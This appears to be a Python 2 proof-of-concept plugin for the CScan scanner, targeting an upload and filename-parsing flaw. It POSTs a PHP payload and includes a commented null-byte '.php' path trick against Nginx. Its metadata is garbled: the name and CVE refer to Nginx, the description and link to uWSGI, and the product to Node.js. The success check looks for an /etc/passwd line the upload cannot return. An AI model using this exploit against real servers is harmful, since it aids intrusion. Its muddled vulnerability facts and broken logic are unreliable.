# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Nginx_0001'  # 平台漏洞编号，留空
    name = 'Nginx 文件名逻辑漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_UPLOAD  # 漏洞类型
    disclosure_date = ''  # 漏洞公布时间
    desc = '''
    uWSGI 2.0.17之前的PHP插件，没有正确的处理DOCUMENT_ROOT检测，导致用户可以通过..%2f来跨域目录，读取或运行DOCUMENT_ROOT目录以外的文件。
    '''  # 漏洞描述
    ref = 'https://github.com/vulhub/vulhub/tree/master/uwsgi/CVE-2018-7490'  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = 'CVE-2013-4547'  # cve编号
    product = 'Node.js'  # 漏洞应用名称
    product_version = 'node.js 8.5.0 到8.6.0版本'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '2fbcb264-0046-4fba-af9b-c1dba3d850a7'
    author = 'cscan'  # POC编写者
    create_date = '2018-04-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            head = {
                'User-Agent': 'Mozilla/5.0',
                'Content-Type': 'multipart/form-data'
            }
            data = """   
                <?php\recho "c4ca4238a0b923820dcc509a6f75849b";\r?>\r
            """
            files = {'FILE_UPLOAD' :open('1.jpg ','rb')}
            
            request = requests.post(self.target, files=files, data=data, headers=head)
            #r = requests.get('http://127.0.0.1:8080/uploadfiles/1.gif[0x20][0x00].php')
            print(request.request.headers)
            print(request.request.body)
            print(request.status_code)
            

            if 'root:x:0:0:root:/root:/bin/bash' in request.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
